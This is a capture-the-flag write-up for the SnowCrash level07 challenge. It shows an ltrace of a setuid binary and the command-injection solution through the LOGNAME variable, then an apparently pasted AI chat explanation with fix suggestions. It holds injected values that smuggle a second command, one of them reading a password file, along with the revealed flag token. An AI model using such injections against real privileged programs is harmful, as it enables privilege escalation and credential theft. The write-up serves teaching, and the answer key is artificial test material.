# level07
## Introduction

This level07 binary contains a classic command injection vulnerability due to unsanitized use of getenv("LOGNAME") in a system() call. A user can exploit this to execute arbitrary shell commands with elevated privileges and likely extract a flag or password in the SnowCrash challenge.


## Observations

level07@SnowCrash:~$ ls
level07
level07@SnowCrash:~$ ./level07 
level07
level07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff6e4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                    = 2007
geteuid()                                    = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
getenv("LOGNAME")                            = "level07"
asprintf(0xbffff634, 0x8048688, 0xbfffff1a, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                       = 0
+++ exited (status 0) +++



## Final solution
level07@SnowCrash:~$ export LOGNAME=\`getflag\`
level07@SnowCrash:~$ ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h


The output you're showing is from `ltrace ./level07`, which traces calls to **library functions** (like `system`, `getenv`, `asprintf`, etc.) made by the `level07` binary on the SnowCrash wargame system. Here's a breakdown of what this binary does and the **potential security risks** involved:

---

### 🔍 **Step-by-step Breakdown**

1. **Program Entry**

   ```
   __libc_start_main(0x8048514, ...)
   ```

   This is the standard entry point for a C program, calling the `main` function.

2. **Effective UID/GID Handling**

   ```
   getegid() = 2007
   geteuid() = 2007
   setresgid(2007, 2007, 2007)
   setresuid(2007, 2007, 2007)
   ```

   The program sets its real, effective, and saved UID/GID to **2007**. This means:

   * The binary is likely **setuid-root** or **setuid-level07**, running with **elevated privileges** (to user 2007, presumably the owner of a more privileged file or password).

3. **Reads Environment Variable**

   ```
   getenv("LOGNAME") = "level07"
   ```

   It reads the `LOGNAME` environment variable, which can be controlled by the **user**.

4. **String Formatting**

   ```
   asprintf(0xbffff634, 0x8048688, 0xbfffff1a) = 18
   ```

   It uses `asprintf` to create a string, probably like:

   ```c
   asprintf(&cmd, "/bin/echo %s", getenv("LOGNAME"));
   ```

   So `cmd` becomes:

   ```
   /bin/echo level07
   ```

5. **System Call**

   ```
   system("/bin/echo level07")
   ```

   It calls `system()` to run a shell command — in this case, echoing the username.

---

### ⚠️ **Security Risks**

#### 1. ✅ **Command Injection (Potential Exploit)**

Since the value of `LOGNAME` comes from the **environment**, and it's directly embedded into a shell command (`system()`), this is a **command injection vulnerability**:

> If a malicious user runs the program like this:

```bash
LOGNAME='level07; cat /home/level07/.pass' ./level07
```

Then the command executed becomes:

```bash
/bin/echo level07; cat /home/level07/.pass
```

This will display the password file contents if the program runs with the privileges of `level07`.

---

#### 2. ❌ **Use of `system()`**

Using `system()` with user-controlled input is dangerous. It invokes a shell and executes arbitrary commands. It's almost always better to use safer alternatives like `execve()` with controlled arguments.

---

#### 3. 🧪 **Environment Variables**

Reading from `getenv()` introduces attack vectors when combined with insecure shell execution. The attacker can fully control `LOGNAME` from the environment.

---

### 🛡️ **Fix Suggestions**

* Avoid `system()` entirely for user input.
* Sanitize or validate input if it's absolutely necessary.
* Use `execve()` or similar calls with strict argument parsing.
* Drop privileges as soon as they’re not needed.

---

### ✅ **Conclusion**

This `level07` binary contains a classic **command injection vulnerability** due to unsanitized use of `getenv("LOGNAME")` in a `system()` call. A user can exploit this to execute arbitrary shell commands with elevated privileges and likely extract a flag or password in the SnowCrash challenge.

Would you like to see an actual exploit example?
